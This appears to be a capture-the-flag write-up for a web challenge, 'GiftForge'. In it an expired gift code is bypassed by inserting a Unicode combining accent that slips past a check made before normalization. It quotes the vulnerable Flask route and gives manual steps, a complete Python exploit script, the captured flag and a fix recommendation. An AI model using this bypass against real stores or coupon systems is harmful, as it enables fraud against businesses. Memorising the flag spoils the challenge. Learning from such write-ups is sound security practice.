# GiftForge
---
## Challenge Info
- Name: GiftForge
- Category: Web
- Difficulty: Very Easy
- Flag format: `VBD{...}`
- Instance URL used: `http://82.29.170.47:24176`

---

## TL;DR
The app blocks `GIFT500` **before** Unicode normalization, then normalizes input and checks `GIFT500` again.  
So sending a Unicode-lookalike code (e.g. `GI\u0301FT500`) bypasses the first "expired" check but becomes `GIFT500` after normalization, granting +500 credits. Then buy **The Secret Flag** card and read flag from profile inventory.

---

## Source Code Analysis (Root Cause)
In `src/app.py`:

```python
@app.route('/redeem', methods=['GET', 'POST'])
@login_required
def redeem():
    if request.method == 'POST':
        code = request.form.get('code', '').strip()
        
        if code == "GIFT500":
            flash('This special offer has expired.', 'error')
            return redirect(url_for('redeem'))

        code = "".join(c for c in unicodedata.normalize('NFKD', code) if not unicodedata.combining(c)).upper()
        
        if code == "GIFT500":
            current_user.balance += 500.0
            db.session.commit()
            flash('500 credits added to your account.', 'success')
            return redirect(url_for('store'))
```

### Why vulnerable?
- Check #1 compares raw input exactly to `"GIFT500"`.
- Then input is normalized with NFKD and combining marks removed.
- Check #2 compares normalized string to `"GIFT500"` and gives bonus.

Payload example:
- Input: `GIÌFT500` (that `IÌ` is `I` + combining accent `\u0301`)
- Raw compare: not equal to `GIFT500` â†’ bypasses expiry block
- Normalized compare: becomes `GIFT500` â†’ grants +500 credits

---

## Exploitation Steps (Manual)
1. Register a new account.
2. Go to `/redeem`.
3. Submit code: `GIÌFT500` (Unicode combining accent).
4. Balance becomes `$1500.00`.
5. Buy **The Secret Flag** card (`/buy/4`, costs 1337).
6. Open `/profile` and read the card code (the flag).

---

## Automated Exploit Script
File: `1. ctf/giftforge-web/exploit_giftforge.py`

```python
import re
import secrets
import string
import requests

BASE = "http://82.29.170.47:24176"

s = requests.Session()

username = "pwn_" + ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
password = "P@ssw0rd123!"


def must(cond, msg):
    if not cond:
        raise RuntimeError(msg)

print(f"[*] Target: {BASE}")
print(f"[*] Username: {username}")

# 1) Signup
r = s.post(f"{BASE}/signup", data={"username": username, "password": password}, allow_redirects=True, timeout=20)
r.raise_for_status()
must("Digital Forge Store" in r.text or "Current Balance" in r.text, "Signup/Login failed")
print("[+] Signed up and logged in")

# 2) Redeem Unicode-bypassed GIFT500
# "GI\u0301FT500" -> raw != "GIFT500", normalized -> "GIFT500"
bypass_code = "GI\u0301FT500"
r = s.post(f"{BASE}/redeem", data={"code": bypass_code}, allow_redirects=True, timeout=20)
r.raise_for_status()
must("500 credits added" in r.text or "Digital Forge Store" in r.text, "Redeem bypass may have failed")
print(f"[+] Redeemed bypass code: {bypass_code.encode('unicode_escape').decode()}")

# 3) Buy The Secret Flag (id=4 from source)
r = s.post(f"{BASE}/buy/4", allow_redirects=True, timeout=20)
r.raise_for_status()
print("[+] Attempted purchase of secret card")

# 4) Extract flag from profile
r = s.get(f"{BASE}/profile", timeout=20)
r.raise_for_status()

flag_match = re.search(r"VBD\{[^}]+\}", r.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"\n[FLAG] {flag}")
else:
    codes = re.findall(r'<code class="card-code">([^<]+)</code>', r.text)
    print("[!] No direct VBD{} match. Inventory codes:")
    for c in codes:
        print(f"    - {c}")
    raise RuntimeError("Flag not found in profile response")
```

Run:

```bash
python exploit_giftforge.py
```

---

## Flag

`VBD{n0rmalization_1s_3asy_1337_a660d3909fa8bb7015edf779ebefb9d0}`

---

## Security Fix Recommendation
Normalize first, then perform **single** validation path for coupon logic.

Safer pattern:
1. `normalized = normalize(user_input)`
2. Compare only `normalized` against all coupon rules
3. Avoid split validation branches on raw and normalized forms

